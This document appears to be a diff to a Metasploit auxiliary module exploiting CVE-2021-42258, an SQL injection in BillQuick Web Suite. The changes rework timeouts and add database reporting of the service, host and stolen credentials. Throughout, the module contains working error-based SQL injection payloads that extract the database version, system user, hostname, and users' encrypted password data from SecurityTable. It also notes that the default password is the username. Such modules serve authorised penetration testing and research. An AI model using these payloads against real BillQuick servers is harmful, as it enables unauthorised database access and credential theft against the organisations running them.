@@ -6,8 +6,8 @@
 class MetasploitModule < Msf::Auxiliary
 
   prepend Msf::Exploit::Remote::AutoCheck
-  include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(
@@ -25,13 +25,16 @@ class MetasploitModule < Msf::Auxiliary
         'License' => MSF_LICENSE,
         'Author' => [
           'h00die', # msf module
-          'Caleb Stewart' # original PoC, analysis
+          'Caleb Stewart <caleb.stewart94@gmail.com>' # original PoC, analysis
         ],
         'References' => [
           ['URL', 'https://www.huntress.com/blog/threat-advisory-hackers-are-exploiting-a-vulnerability-in-popular-billing-software-to-deploy-ransomware'],
           ['URL', 'http://billquick.net/download/Support_Download/BQWS2021Upgrade/WebSuite2021LogFile_9_1.pdf'],
           ['CVE', '2021-42258']
         ],
+        'DefaultOptions' => {
+          'HttpClientTimeout' => 15 # The server tends to be super slow, so allow 15sec per request
+        },
         'DisclosureDate' => '2021-10-22',
         'Notes' => {
           'Stability' => [CRASH_SAFE],
@@ -43,8 +46,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(80),
-        OptString.new('TARGETURI', [ true, 'The URI of BillQuick Web Suite', '/ws2020/']),
-        OptInt.new('TIMEOUT', [ true, 'The timeout for HTTP requests. Responses are slow.', 15])
+        OptString.new('TARGETURI', [ true, 'The URI of BillQuick Web Suite', '/ws2020/'])
       ], self.class
     )
   end
@@ -54,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_cgi({
         'uri' => normalize_uri(target_uri.path, 'default.aspx'),
         'method' => 'GET'
-      }, datastore['TIMEOUT'])
+      }, datastore['HttpClientTimeout'])
       fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
       fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code != 200
 
@@ -96,19 +98,19 @@ class MetasploitModule < Msf::Auxiliary
         'txtPW' => '',
         'hdnClientDPI' => '96'
       }
-    }, datastore['TIMEOUT'])
+    }, datastore['HttpClientTimeout'])
 
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
     fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code != 200
     res.body
   end
 
-  def run_host(_ip)
+  def run
     vprint_status('Getting Variables')
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'default.aspx'),
       'method' => 'GET'
-    }, datastore['TIMEOUT'])
+    }, datastore['HttpClientTimeout'])
 
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
     fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code != 200
@@ -129,15 +131,26 @@ class MetasploitModule < Msf::Auxiliary
     footer_char = char_list(footer)
     int = Rex::Text.rand_text_numeric(4)
 
+    service = {
+      address: rhost,
+      port: datastore['RPORT'],
+      protocol: 'tcp',
+      service_name: 'BillQuick Web Suite',
+      workspace_id: myworkspace_id
+    }
+    report_service(service)
+
     # all inject strings taken from sqlmap runs, using error page method
     res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND CHARINDEX(CHAR(49)+CHAR(53)+CHAR(46)+CHAR(48)+CHAR(46),@@VERSION)>0)+'", viewstate, viewstategenerator, eventvalidation)
     /, table \\u0027(?<table>.+?)\\u0027/ =~ error_info(res)
     print_good("Current Database: #{table.split('.').first}")
+    report_note(host: rhost, port: rport, type: 'database', data: table.split('.').first)
 
     res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND 1325 IN (SELECT (#{header_char}+(SELECT SUBSTRING((ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))),1,1024))+#{footer_char})))+'", viewstate, viewstategenerator, eventvalidation)
     /\\u0027(?<banner>.+?)\\u0027/ =~ error_info(res)
     banner.slice!(header)
     banner.slice!(footer)
+    banner = banner.gsub('\n', "\n").gsub('\t', "\t")
     print_good("Banner: #{banner}")
 
     res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND 8603 IN (SELECT (#{header_char}+(SELECT SUBSTRING((ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32))),1,1024))+#{footer_char})))+'", viewstate, viewstategenerator, eventvalidation)
@@ -145,12 +158,22 @@ class MetasploitModule < Msf::Auxiliary
     user.slice!(header)
     user.slice!(footer)
     print_good("DB User: #{user}")
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: user,
+      private_type: :nonreplayable_hash,
+      private_data: ''
+    }.merge(service)
+    create_credential(credential_data)
 
     res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND 7555 IN (SELECT (#{header_char}+(SUBSTRING((ISNULL(CAST(@@SERVERNAME AS NVARCHAR(4000)),CHAR(32))),1,1024))+#{footer_char})))+'", viewstate, viewstategenerator, eventvalidation)
     /\\u0027(?<hostname>.+?)\\u0027/ =~ error_info(res)
     hostname.slice!(header)
     hostname.slice!(footer)
     print_good("Hostname: #{hostname}")
+
+    report_host(host: rhost, name: hostname, info: banner.gsub('\n', "\n").gsub('\n', "\n"), os_name: OperatingSystems::WINDOWS)
 
     sec_table = "#{table.split('.')[0...-1].join('.')}.SecurityTable"
 
@@ -189,7 +212,16 @@ class MetasploitModule < Msf::Auxiliary
       settings.slice!(footer)
       print_good("User #{username} settings: #{settings}")
       table << [username, settings]
+      credential_data = {
+        origin_type: :service,
+        module_fullname: fullname,
+        username: username,
+        private_type: :nonreplayable_hash, # prob encrypted not hash, so lies.
+        private_data: settings.split('|').first
+      }.merge(service)
+      create_credential(credential_data)
     end
     print_good(table.to_s)
+    print_status('Default password is the username.')
   end
 end
